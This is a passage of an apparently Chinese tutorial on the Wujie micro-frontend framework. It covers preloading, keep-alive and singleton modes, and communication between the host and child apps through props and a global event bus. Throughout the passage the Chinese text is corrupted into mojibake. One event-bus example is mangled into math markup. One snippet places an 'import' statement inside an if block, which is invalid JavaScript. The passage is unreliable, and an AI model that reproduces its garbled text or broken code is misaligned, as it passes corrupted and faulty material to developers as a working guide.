<li>urlï¼šå­åº”ç”¨çš„å…¥å£åœ°å€ï¼ˆå¿…é¡»æ˜¯å®Œæ•´çš„ http:// æˆ– https://ï¼‰ã€‚</li>
<li>syncï¼štrue è¡¨ç¤ºè·¯ç”±åŒæ­¥ï¼ˆå­åº”ç”¨è·¯ç”±å˜äº†ï¼Œæµè§ˆå™¨åœ°å€æ ä¹Ÿä¼šå˜ï¼‰ã€‚</li>
<li>propsï¼šå¯ä»¥ç»™å­åº”ç”¨ä¼ æ•°æ®ï¼Œå­åº”ç”¨é‡Œç”¨ window.$wujie.props æ‹¿ã€‚</li>
</ul>
<h5 data-id="heading-5">5. é¢„åŠ è½½ï¼ˆæ¨èï¼ŒåŠ é€Ÿåˆ‡æ¢ï¼‰</h5>
<p>åœ¨åŸºåº§çš„å…¥å£æ–‡ä»¶ï¼ˆæ¯”å¦‚ App.vue çš„ mountedï¼‰é‡Œé¢„åŠ è½½ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-php" lang="php">import { preloadApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie-vue3'</span>

<span class="hljs-title function_ invoke__">preloadApp</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å”¯ä¸€åå­—'</span>,
  <span class="hljs-attr">url</span>: <span class="hljs-string">'å­åº”ç”¨åœ°å€'</span>
})
</code></pre>
<h5 data-id="heading-6">6. å¯åŠ¨åŸºåº§</h5>
<p>text</p>
<pre><code class="hljs language-arduino" lang="arduino">npm run dev
</code></pre>
<p>æ‰“å¼€é¡µé¢ï¼Œä½ å°±ä¼šçœ‹åˆ°å­åº”ç”¨åµŒè¿›æ¥äº†ï¼</p>
<h4 data-id="heading-7">ç¬¬ä¸‰æ­¥ï¼šå­åº”ç”¨æ€ä¹ˆé…ç½®ï¼ˆæœ€å‹å¥½çš„æ˜¯é›¶æ”¹é€ ï¼ï¼‰</h4>
<p>å­åº”ç”¨å°±æ˜¯ä½ åŸæ¥çš„æ™®é€šé¡¹ç›®ï¼ˆVueã€Reactã€Vite ç­‰ï¼‰ã€‚</p>
<p><strong>è¶…çº§å¥½æ¶ˆæ¯ï¼šç”¨â€œä¿æ´»æ¨¡å¼â€æˆ–â€œé‡å»ºæ¨¡å¼â€ï¼Œå­åº”ç”¨å®Œå…¨ä¸ç”¨æ”¹ä»£ç ï¼</strong></p>
<h5 data-id="heading-8">æ¨èæ–¹å¼ï¼šä¿æ´»æ¨¡å¼ï¼ˆkeep-aliveï¼Œæœ€ä¸æ»‘ï¼Œæ— ç™½å±ï¼‰</h5>
<p>åœ¨åŸºåº§çš„  ç»„ä»¶ä¸ŠåŠ ä¸€ä¸ªå±æ€§ï¼š</p>
<p>vue</p>
<pre><code class="hljs language-ini" lang="ini">&lt;wujie-vue
  ...
  <span class="hljs-attr">alive</span>=<span class="hljs-string">"true"</span>   &lt;!-- å°±æ˜¯è¿™ä¸€è¡Œï¼å¼€å¯ä¿æ´» --&gt;
&gt;&lt;/wujie-vue&gt;
</code></pre>
<p>å®Œäº†ï¼å­åº”ç”¨é›¶æ”¹é€ ï¼Œåˆ‡æ¢å›æ¥ä¸ä¼šé‡æ–°åŠ è½½ï¼Œè¶…çº§å¿«ã€‚</p>
<h5 data-id="heading-9">å¦‚æœä½ æƒ³ç”¨å•ä¾‹æ¨¡å¼ï¼ˆå¤šä¸ªåœ°æ–¹å…±ç”¨åŒä¸€ä¸ªå®ä¾‹ï¼Œéœ€è¦æ”¹é€ ä¸€ç‚¹ï¼‰</h5>
<p>åªåœ¨å­åº”ç”¨çš„å…¥å£æ–‡ä»¶ï¼ˆmain.js æˆ– index.jsï¼‰é‡ŒåŒ…ä¸€å±‚åˆ¤æ–­ï¼š</p>
<p><strong>Vue3 ç¤ºä¾‹ï¼ˆvite é¡¹ç›®ï¼‰</strong> ï¼š åœ¨ main.js æœ€å¤–é¢åŒ…èµ·æ¥ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-scss" lang="scss">let instance

if (window.__POWERED_BY_WUJIE__) {
  <span class="hljs-comment">// è¢« Wujie åŠ è½½æ—¶çš„ç”Ÿå‘½å‘¨æœŸ</span>
  window<span class="hljs-selector-class">.__WUJIE_MOUNT</span> = () =&gt; {
    instance = <span class="hljs-built_in">createApp</span>(App)<span class="hljs-selector-class">.use</span>(router)<span class="hljs-selector-class">.mount</span>('#app')
  }
  window<span class="hljs-selector-class">.__WUJIE_UNMOUNT</span> = () =&gt; {
    instance<span class="hljs-selector-class">.unmount</span>()
  }
  <span class="hljs-comment">// å¦‚æœæ˜¯ Vite æ„å»ºçš„ï¼Œéœ€è¦ä¸»åŠ¨è§¦å‘</span>
  window<span class="hljs-selector-class">.__WUJIE</span><span class="hljs-selector-class">.mount</span>()
} else {
  <span class="hljs-comment">// ç‹¬ç«‹è¿è¡Œæ—¶</span>
  <span class="hljs-built_in">createApp</span>(App)<span class="hljs-selector-class">.use</span>(router)<span class="hljs-selector-class">.mount</span>('#app')
}
</code></pre>
<p>å…¶ä»–æ¡†æ¶ï¼ˆReactã€Vue2ï¼‰æ–‡æ¡£é‡Œéƒ½æœ‰ç¤ºä¾‹ï¼ŒåŸºæœ¬å°±æ˜¯æŠŠ mount å’Œ unmount æŒ‚åˆ° window ä¸Šã€‚</p>
<p><strong>å¼ºçƒˆå»ºè®®å°ç™½å…ˆç”¨ä¿æ´»æ¨¡å¼</strong>ï¼Œå®Œå…¨ä¸ç”¨æ”¹å­åº”ç”¨ã€‚</p>
<h3 data-id="heading-10">å•ä¾‹æ¨¡å¼VSä¿æ´»æ¨¡å¼</h3>
<h4 data-id="heading-11">ä¿æ´»æ¨¡å¼</h4>
<p>ä»€ä¹ˆæ˜¯ä¿æ´»æ¨¡å¼ï¼Ÿæƒ³è±¡å­åº”ç”¨æ˜¯ä¸€ä¸ªâ€œç©å…·æˆ¿å­â€ï¼›</p>
<ul>
<li>æ­£å¸¸æƒ…å†µï¼Œä½ ç¦»å¼€æˆ¿é—´ï¼ˆåˆ‡æ¢é¡µé¢ï¼‰ï¼Œæˆ¿å­å°±è¢«æ‹†æ‰ï¼ˆå¸è½½ï¼‰ï¼Œå›æ¥éœ€è¦é‡æ–°æ­ï¼ˆé‡æ–°åŠ è½½ï¼Œæœ‰ç™½å±ï¼‰</li>
<li>ä¿æ´»æ¨¡å¼ï¼Œæˆ¿å­ä¸€ç›´ç•™åœ¨åŸåœ°ä¸æ‹†ï¼ˆä¿æŒæ´»ç€ï¼‰ï¼Œä½ å›æ¥ç›´æ¥ç©ï¼ˆé›¶ç™½å±ï¼ŒçŠ¶æ€å®Œå…¨ä¿ç•™ï¼Œæ¯”å¦‚è¾“å…¥æ¡†çš„å†…å®¹è¿˜åœ¨ï¼‰</li>
<li>ä¼˜ç‚¹ï¼š
<ul>
<li>é…ç½®æœ€ç®€å•</li>
<li>é›¶æ”¹é€ å­åº”ç”¨</li>
<li>åˆ‡æ¢æœ€å¿«ã€æ— ç™½å±</li>
</ul>
</li>
<li>ç¼ºç‚¹ï¼š
å¦‚æœåŸºåº§å¤šä¸ªåœ°æ–¹åŠ è½½åŒä¸€ä¸ªå­åº”ç”¨ï¼ŒçŠ¶æ€ä¸å…±äº«ï¼ˆæ¯ä¸ªæ˜¯ç‹¬ç«‹çš„â€œæˆ¿å­â€ï¼‰</li>
<li>é€‚åˆåœºæ™¯ï¼šå¯¼èˆªèœå•åˆ‡æ¢å­åº”ç”¨ï¼ŒTabé¡µåˆ‡æ¢ï¼Œå¤§å¤šæ•°é¡¹ç›®éƒ½å…ˆç”¨è¿™ä¸ª</li>
</ul>
<h4 data-id="heading-12">å•ä¾‹æ¨¡å¼</h4>
<p>ä»€ä¹ˆæ˜¯å•ä¾‹æ¨¡å¼ï¼Ÿ
å…¨å±€åªæœ‰ä¸€ä¸ªæˆ¿å­ï¼ä¸ç®¡ä½ åœ¨å‡ ä¸ªæˆ¿é—´æ”¾å‡ ä¸ªé—¨ï¼ˆå¤šä¸ªå®¹å™¨åŠ è½½åŒä¸€ä¸ªå­åº”ç”¨ï¼‰ï¼Œå¼€é—¨è¿›é—¨çš„éƒ½æ˜¯åŒä¸€ä¸ªæˆ¿å­ï¼ˆå…±äº«åŒä¸€ä¸ªå®ä¾‹å’ŒçŠ¶æ€ï¼‰ã€‚
æ€ä¹ˆé…ç½®ï¼š
* åŸºåº§ä¸ç”¨ç‰¹æ®Šé…ç½®ï¼ˆå¯ä»¥ç»“åˆalive=trueä¸€èµ·ä½¿ç”¨ï¼‰
* å…³é”®ï¼š å­åº”ç”¨éœ€è¦æ”¹é€ ä»£ç ï¼ˆæ‰‹åŠ¨æ§åˆ¶æŒ‚è½½å’Œå¸è½½ï¼‰
å­åº”ç”¨æ”¹é€ ç¤ºä¾‹ï¼ˆVue3+Viteé¡¹ç›®ä¸ºä¾‹ï¼Œåœ¨main.jsæˆ–main.tsæœ€å¤–é¢åŒ…ä¸€å±‚ï¼‰ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> { createApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./App.vue'</span>
<span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span>

<span class="hljs-keyword">let</span> instance = <span class="hljs-literal">null</span>  <span class="hljs-comment">// å…¨å±€åªæœ‰ä¸€ä¸ª instance</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">mount</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (!instance) {
    instance = <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>)
    instance.<span class="hljs-title function_">use</span>(router)
    instance.<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)  <span class="hljs-comment">// æŒ‚è½½åˆ°å®¹å™¨</span>
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">unmount</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (instance) {
    instance.<span class="hljs-title function_">unmount</span>()
    instance = <span class="hljs-literal">null</span>  <span class="hljs-comment">// å¯é€‰ï¼šé”€æ¯å®ä¾‹</span>
  }
}

<span class="hljs-comment">// è¢« Wujie åŠ è½½æ—¶ï¼ˆå¾®å‰ç«¯æ¨¡å¼ï¼‰</span>
<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_WUJIE__</span>) {
  <span class="hljs-comment">// æŒ‚åˆ° window ä¸Šï¼ŒWujie ä¼šè‡ªåŠ¨è°ƒç”¨</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE_MOUNT</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">mount</span>()
  }
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE_UNMOUNT</span> = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">unmount</span>()
  }
  
  <span class="hljs-comment">// Vite é¡¹ç›®éœ€è¦ä¸»åŠ¨è§¦å‘ä¸€æ¬¡ï¼ˆæœ‰äº›æ„å»ºå·¥å…·éœ€è¦ï¼‰</span>
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">__WUJIE</span>.<span class="hljs-property">mount</span>?.()
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// ç‹¬ç«‹è¿è¡Œæ—¶ï¼ˆç›´æ¥ npm run devï¼‰</span>
  <span class="hljs-title function_">createApp</span>(<span class="hljs-title class_">App</span>).<span class="hljs-title function_">use</span>(router).<span class="hljs-title function_">mount</span>(<span class="hljs-string">'#app'</span>)
}
</code></pre>
<ul>
<li>å•ä¾‹æ¨¡å¼ç‰¹ç‚¹ï¼š
<ul>
<li>å…¨å±€åªæœ‰ä¸€ä¸ªå­åº”ç”¨å®ä¾‹</li>
<li>å¤šä¸ªåœ°æ–¹åŠ è½½åŒä¸€ä¸ªurlçš„å­åº”ç”¨ï¼Œå…±äº«çŠ¶æ€ï¼ˆæ¯”å¦‚ç™»å½•ç”¨æˆ·ä¿¡æ¯å…¨å±€å…±äº«ï¼‰</li>
<li>åˆ‡æ¢æ—¶å¯ä»¥ä¸é‡å»ºï¼ˆå¦‚æœç»“åˆä¿æ´»ï¼‰</li>
<li>éœ€è¦æ”¹åœ¨å­åº”ç”¨ï¼ˆ__WUJIE_MOUNTå’Œ__WUJIE_UNMOUNTï¼‰</li>
</ul>
</li>
<li>ä¼˜ç‚¹ï¼š
<ul>
<li>çŠ¶æ€å…¨å±€å…±äº«ï¼ˆé€‚åˆéœ€è¦å•ç‚¹ç™»å½•ã€å…±äº«ç”¨æˆ·æ•°æ®ç­‰ï¼‰</li>
<li>å†…å­˜å ç”¨æ›´å°‘ï¼ˆåªæœ‰ä¸€ä¸ªå®ä¾‹ï¼‰</li>
</ul>
</li>
<li>ç¼ºç‚¹ï¼š
<ul>
<li>éœ€è¦æ”¹é€ å­åº”ç”¨ä»£ç </li>
<li>å¦‚æœä¸ç»“åˆä¿æ´»ï¼Œåˆ‡æ¢å¯èƒ½æœ‰è½»å¾®é‡å»º</li>
</ul>
</li>
<li>é€‚åˆåœºæ™¯ï¼š å­åº”ç”¨éœ€è¦åœ¨åŸºåº§å¤šä¸ªä½ç½®å‡ºç°ï¼Œä½†çŠ¶æ€ä¸€è‡´ï¼ˆæ¯”å¦‚å…¨å±€å…±äº«çš„ä¾§è¾¹æ ï¼Œå¤´éƒ¨ç»„ä»¶ï¼‰</li>
<li>æœ€å¼ºç»„åˆï¼šå•ä¾‹æ¨¡å¼+ä¿æ´»æ¨¡å¼ä¸€èµ·ç”¨ï¼</li>
</ul>
<h4 data-id="heading-13">ç¬¬å››æ­¥ï¼šå¸¸è§é—®é¢˜æ³¨æ„äº‹é¡¹ï¼ˆå°ç™½å¿…çœ‹ï¼‰</h4>
<ol>
<li><strong>è·¨åŸŸé—®é¢˜</strong>ï¼šå­åº”ç”¨çš„åœ°å€å¿…é¡»å’ŒåŸºåº§åŒåŸŸï¼Œæˆ–è€…å­åº”ç”¨æœåŠ¡å™¨å¼€ CORSï¼ˆå…è®¸è·¨åŸŸï¼‰ã€‚æœ¬åœ°å¼€å‘æ—¶ï¼Œä¸¤ä¸ªé¡¹ç›®ç”¨ä¸åŒç«¯å£ï¼Œå°±è¦å¼€ä»£ç†æˆ–ç”¨ nginxã€‚</li>
<li><strong>å­åº”ç”¨åœ°å€</strong>ï¼šæœ¬åœ°å¼€å‘æ—¶ï¼Œå­åº”ç”¨å…ˆå•ç‹¬è·‘èµ·æ¥ï¼ˆnpm run devï¼‰ï¼Œæ‹¿åˆ° <a href="https://link.juejin.cn?target=http%3A%2F%2Flocalhost%3Axxxx%25EF%25BC%258C%25E7%2584%25B6%25E5%2590%258E%25E5%25A1%25AB%25E5%2588%25B0%25E5%259F%25BA%25E5%25BA%25A7%25E7%259A%2584" target="_blank" title="http://localhost:xxxx%EF%BC%8C%E7%84%B6%E5%90%8E%E5%A1%AB%E5%88%B0%E5%9F%BA%E5%BA%A7%E7%9A%84" ref="nofollow noopener noreferrer">http://localhost:xxxxï¼Œç„¶åå¡«åˆ°åŸºåº§çš„</a> urlã€‚</li>
<li><strong>æ ·å¼éš”ç¦»</strong>ï¼šWujie å¤©ç”Ÿéš”ç¦»å¥½ï¼Œå­åº”ç”¨æ ·å¼ä¸ä¼šæ±¡æŸ“åŸºåº§ã€‚</li>
<li><strong>é€šä¿¡</strong>ï¼šåŸºåº§ä¼ æ•°æ®ç”¨ propsï¼›å­åº”ç”¨å‘äº‹ä»¶ç”¨ bus.<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>i</mi><mi>t</mi><msup><mo stretchy="false">(</mo><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mtext>äº‹ä»¶</mtext><msup><mtext>å</mtext><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo separator="true">,</mo><mtext>æ•°æ®</mtext><mo stretchy="false">)</mo><mtext>ï¼›åŸºåº§ç›‘å¬</mtext><mi>b</mi><mi>u</mi><mi>s</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">emit('äº‹ä»¶å', æ•°æ®)ï¼›åŸºåº§ç›‘å¬ bus.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0019em;vertical-align:-0.25em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mi</span><span class="mord mathnormal">t</span><span class="mopen"><span class="mopen">(</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">äº‹ä»¶</span><span class="mord"><span class="mord cjk_fallback">å</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord cjk_fallback">æ•°æ®</span><span class="mclose">)</span><span class="mord cjk_fallback">ï¼›åŸºåº§ç›‘å¬</span><span class="mord mathnormal">b</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord">.</span></span></span></span></span>on('äº‹ä»¶å', handler)ã€‚</li>
</ol>
<h2 data-id="heading-14">Wujieå¾®å‰ç«¯çš„é€šä¿¡æ–¹æ¡ˆï¼ˆåŸºåº§ â†” å­åº”ç”¨ã€å­åº”ç”¨ â†” å­åº”ç”¨ï¼‰</h2>
<p>Wujie çš„é€šä¿¡è®¾è®¡éå¸¸ç®€å•å’Œå¼ºå¤§ï¼Œå®ƒå†…ç½®äº†ä¸€ä¸ª<strong>å…¨å±€äº‹ä»¶æ€»çº¿ï¼ˆEventBusï¼‰</strong> ï¼Œæ‰€æœ‰å­åº”ç”¨å’ŒåŸºåº§éƒ½å…±äº«åŒä¸€ä¸ª bus å¯¹è±¡ã€‚è¿™æ„å‘³ç€ï¼š</p>
<ul>
<li><strong>åŸºåº§ â†’ å­åº”ç”¨</strong>ï¼šå•å‘ä¼ å€¼æœ€å¸¸ç”¨çš„æ˜¯ props</li>
<li><strong>å­åº”ç”¨ â†’ åŸºåº§</strong>ï¼šå­åº”ç”¨é€šè¿‡ bus.$emit å‘äº‹ä»¶ï¼ŒåŸºåº§ç›‘å¬</li>
<li><strong>å­åº”ç”¨ â†” å­åº”ç”¨</strong>ï¼šç›´æ¥é€šè¿‡åŒä¸€ä¸ª bus äº’ç›¸å‘äº‹ä»¶å’Œç›‘å¬ï¼ˆä¸éœ€è¦ç»è¿‡åŸºåº§ä¸­è½¬ï¼ï¼‰</li>
<li>å¦å¤–è¿˜æœ‰ä¸€äº›è¾…åŠ©æ–¹å¼ï¼ˆå¦‚æ’ä»¶å…±äº«çŠ¶æ€ï¼‰</li>
</ul>
<p>ä¸‹é¢æˆ‘ä¸€æ­¥ä¸€æ­¥æ…¢æ…¢è®²ï¼Œæ¯ç§æ–¹æ¡ˆéƒ½é…ä»£ç ç¤ºä¾‹ï¼ˆåŸºäº Vue3 åŸºåº§ + Vue3/React å­åº”ç”¨é€šç”¨ï¼‰ã€‚</p>
<h5 data-id="heading-15">æ–¹æ¡ˆ1ï¼šåŸºåº§ â†’ å­åº”ç”¨ï¼ˆæ¨èï¼šprops å•å‘ä¼ å€¼ï¼‰</h5>
<p>è¿™æ˜¯æœ€ç®€å•ã€æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚åŸºåº§æŠŠæ•°æ®ä½œä¸º props ä¼ ç»™å­åº”ç”¨ï¼Œå­åº”ç”¨å®æ—¶æ¥æ”¶ï¼ˆæ•°æ®å˜åŒ–ä¼šè‡ªåŠ¨åŒæ­¥ï¼‰ã€‚</p>
<p><strong>åŸºåº§é…ç½®ï¼ˆ ç»„ä»¶ä¸ŠåŠ  propsï¼‰</strong> ï¼š</p>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">wujie-vue</span>
    <span class="hljs-attr">name</span>=<span class="hljs-string">"sub-app1"</span>
    <span class="hljs-attr">url</span>=<span class="hljs-string">"http://localhost:3001"</span>
    <span class="hljs-attr">:props</span>=<span class="hljs-string">"subAppProps"</span>
  &gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">wujie-vue</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> subAppProps = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">token</span>: <span class="hljs-string">'abc123'</span>,
  <span class="hljs-attr">userName</span>: <span class="hljs-string">'å°æ˜'</span>,
  <span class="hljs-attr">count</span>: <span class="hljs-number">0</span>,
  <span class="hljs-comment">// ç”šè‡³å¯ä»¥ä¼ å‡½æ•°ï¼</span>
  <span class="hljs-attr">jumpTo</span>: <span class="hljs-function">(<span class="hljs-params">path</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨è°ƒç”¨äº†åŸºåº§çš„å‡½æ•°ï¼Œè·³è½¬åˆ°'</span>, path)
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ§åˆ¶åŸºåº§è·¯ç”±</span>
  }
})

<span class="hljs-comment">// åŸºåº§ä¿®æ”¹æ•°æ®ï¼Œå­åº”ç”¨ä¼šè‡ªåŠ¨æ”¶åˆ°æ›´æ–°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateCount</span> = (<span class="hljs-params"/>) =&gt; {
  subAppProps.<span class="hljs-property">value</span>.<span class="hljs-property">count</span> += <span class="hljs-number">1</span>
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>å­åº”ç”¨æ¥æ”¶ï¼ˆåœ¨ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥æ‹¿åˆ°ï¼‰</strong> ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å­åº”ç”¨é‡Œï¼ˆVue/React éƒ½ä¸€æ ·ï¼‰</span>
<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">window</span>.<span class="hljs-property">__POWERED_BY_WUJIE__</span>) {
  <span class="hljs-comment">// è¢« Wujie åŠ è½½æ—¶</span>
  <span class="hljs-keyword">const</span> props = <span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>?.<span class="hljs-property">props</span> || {}
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”¶åˆ°åŸºåº§ä¼ æ¥çš„æ•°æ®ï¼š'</span>, props)
  <span class="hljs-comment">// props.token, props.userName, props.count, props.jumpTo()</span>

  <span class="hljs-comment">// å¦‚æœæƒ³å“åº”å¼ï¼ˆVue3 ç¤ºä¾‹ï¼‰</span>
  <span class="hljs-keyword">import</span> { watch } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
  <span class="hljs-title function_">watch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>?.<span class="hljs-property">props</span>, <span class="hljs-function">(<span class="hljs-params">newProps</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'props æ›´æ–°äº†ï¼š'</span>, newProps)
  }, { <span class="hljs-attr">deep</span>: <span class="hljs-literal">true</span> })
}
</code></pre>
<p><strong>ä¼˜ç‚¹</strong>ï¼šå®æ—¶åŒæ­¥ã€ç±»å‹å®‰å…¨ã€æ”¯æŒä¼ å‡½æ•°ï¼ˆå­åº”ç”¨å¯ä»¥è°ƒç”¨åŸºåº§æ–¹æ³•ï¼‰ <strong>ç¼ºç‚¹</strong>ï¼šå•å‘ï¼ˆå­åº”ç”¨ä¸èƒ½ç›´æ¥æ”¹åŸºåº§çš„æ•°æ®ï¼‰</p>
<h5 data-id="heading-16">æ–¹æ¡ˆ2ï¼šå­åº”ç”¨ â†’ åŸºåº§ã€å­åº”ç”¨ â†’ å­åº”ç”¨ï¼ˆå…¨å±€ EventBusï¼‰</h5>
<p>Wujie å†…ç½®äº†ä¸€ä¸ªå…¨å±€ busï¼Œæ‰€æœ‰å­åº”ç”¨å’ŒåŸºåº§å…±äº«åŒä¸€ä¸ªå®ä¾‹ã€‚<strong>å­åº”ç”¨ä¹‹é—´å¯ä»¥ç›´æ¥é€šä¿¡</strong>ï¼Œä¸éœ€è¦åŸºåº§ä¸­è½¬ã€‚</p>
<p><strong>åŸºåº§ç›‘å¬äº‹ä»¶ï¼ˆåœ¨ä»»æ„ç»„ä»¶é‡Œï¼‰</strong> ï¼š</p>
<p>vue</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { onMounted, onUnmounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> { bus } <span class="hljs-keyword">from</span> <span class="hljs-string">'wujie-vue3'</span>  <span class="hljs-comment">// åŸºåº§ç›´æ¥å¯¼å…¥</span>

<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-comment">// ç›‘å¬æ‰€æœ‰å­åº”ç”¨å‘çš„äº‹ä»¶</span>
  bus.$on(<span class="hljs-string">'click-btn'</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'åŸºåº§æ”¶åˆ°äº‹ä»¶ï¼Œæ•°æ®æ˜¯ï¼š'</span>, data)
    <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ›´æ–°åŸºåº§çŠ¶æ€ã€è·³è½¬è·¯ç”±ç­‰</span>
  })

  <span class="hljs-comment">// ç›‘å¬ç‰¹å®šå­åº”ç”¨ï¼ˆå¯é€‰ï¼‰</span>
  bus.$on(<span class="hljs-string">'sub-app1-event'</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> { ... })
})

<span class="hljs-title function_">onUnmounted</span>(<span class="hljs-function">() =&gt;</span> {
  bus.$off(<span class="hljs-string">'click-btn'</span>)  <span class="hljs-comment">// è®°å¾—é”€æ¯ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>å­åº”ç”¨å‘äº‹ä»¶ï¼ˆåœ¨å­åº”ç”¨ä»»æ„ä½ç½®ï¼‰</strong> ï¼š</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å­åº”ç”¨é‡Œï¼ˆä¸éœ€è¦é¢å¤–å®‰è£…ï¼Œç›´æ¥ç”¨ window.$wujie.busï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">sendEvent</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>?.<span class="hljs-property">bus</span>.$emit(<span class="hljs-string">'click-btn'</span>, {
    <span class="hljs-attr">msg</span>: <span class="hljs-string">'æ¥è‡ªå­åº”ç”¨1çš„æ•°æ®'</span>,
    <span class="hljs-attr">value</span>: <span class="hljs-number">999</span>
  })
}

<span class="hljs-comment">// å­åº”ç”¨2 ä¹Ÿå¯ä»¥ç›´æ¥ç›‘å¬å­åº”ç”¨1çš„äº‹ä»¶ï¼</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">$wujie</span>?.<span class="hljs-property">bus</span>.$on(<span class="hljs-string">'click-btn'</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­åº”ç”¨2 æ”¶åˆ°å­åº”ç”¨1çš„äº‹ä»¶ï¼š'</span>, data)
})
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
